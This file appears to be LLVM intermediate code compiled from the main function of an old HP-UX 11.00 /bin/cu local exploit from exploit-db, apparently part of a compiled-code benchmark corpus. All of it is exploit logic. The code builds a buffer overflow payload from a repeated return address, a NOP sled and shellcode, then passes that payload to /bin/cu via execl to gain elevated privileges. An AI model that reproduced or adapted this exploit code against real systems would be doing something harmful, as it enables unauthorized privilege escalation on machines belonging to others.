; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_245.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_245.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@RET = common dso_local global i64 0, align 8
@OFFSET = common dso_local global i32 0, align 4
@hppa_shellcode = common dso_local global i8* null, align 8
@HPPA_NOP = common dso_local global i8 0, align 1
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"HP-UX 11.00 /bin/cu exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"Copyright (c) 2001 Zorgon\0A\00", align 1
@.str.2 = private unnamed_addr constant [56 x i8] c"[return address = %x] [offset = %d] [buffer size = %d]\0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"/bin/cu\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"cu\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-l\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @LEN, align 4
  %12 = add nsw i32 %11, 8
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = load i64, i64* @RET, align 8
  store i64 %16, i64* %9, align 8
  %17 = load i32, i32* @OFFSET, align 4
  store i32 %17, i32* %10, align 4
  %18 = load i32, i32* %4, align 4
  %19 = icmp sgt i32 %18, 1
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  store i32 %24, i32* %10, align 4
  br label %25

25:                                               ; preds = %20, %2
  store i32 0, i32* %8, align 4
  br label %26

26:                                               ; preds = %39, %25
  %27 = load i32, i32* %8, align 4
  %28 = load i32, i32* @LEN, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %42

30:                                               ; preds = %26
  %31 = load i64, i64* %9, align 8
  %32 = load i32, i32* %10, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %31, %33
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = bitcast i8* %37 to i64*
  store i64 %34, i64* %38, align 1
  br label %39

39:                                               ; preds = %30
  %40 = load i32, i32* %8, align 4
  %41 = add nsw i32 %40, 4
  store i32 %41, i32* %8, align 4
  br label %26

42:                                               ; preds = %26
  store i32 0, i32* %8, align 4
  br label %43

43:                                               ; preds = %56, %42
  %44 = load i32, i32* %8, align 4
  %45 = load i32, i32* @LEN, align 4
  %46 = load i8*, i8** @hppa_shellcode, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = sub nsw i32 %45, %47
  %49 = sub nsw i32 %48, 50
  %50 = icmp slt i32 %44, %49
  br i1 %50, label %51, label %59

51:                                               ; preds = %43
  %52 = load i8, i8* @HPPA_NOP, align 1
  %53 = load i32, i32* %8, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %15, i64 %54
  store i8 %52, i8* %55, align 1
  br label %56

56:                                               ; preds = %51
  %57 = load i32, i32* %8, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %8, align 4
  br label %43

59:                                               ; preds = %43
  %60 = load i32, i32* %8, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %15, i64 %61
  %63 = load i8*, i8** @hppa_shellcode, align 8
  %64 = load i8*, i8** @hppa_shellcode, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = call i32 @memcpy(i8* %62, i8* %63, i32 %65)
  %67 = load i32, i32* @stderr, align 4
  %68 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %69 = load i32, i32* @stderr, align 4
  %70 = call i32 (i32, i8*, ...) @fprintf(i32 %69, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %71 = load i32, i32* @stderr, align 4
  %72 = load i64, i64* %9, align 8
  %73 = load i32, i32* %10, align 4
  %74 = sext i32 %73 to i64
  %75 = add nsw i64 %72, %74
  %76 = load i32, i32* %10, align 4
  %77 = call i32 @strlen(i8* %15)
  %78 = call i32 (i32, i8*, ...) @fprintf(i32 %71, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.2, i64 0, i64 0), i64 %75, i32 %76, i32 %77)
  %79 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %15, i32 0)
  %80 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %80)
  %81 = load i32, i32* %3, align 4
  ret i32 %81
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
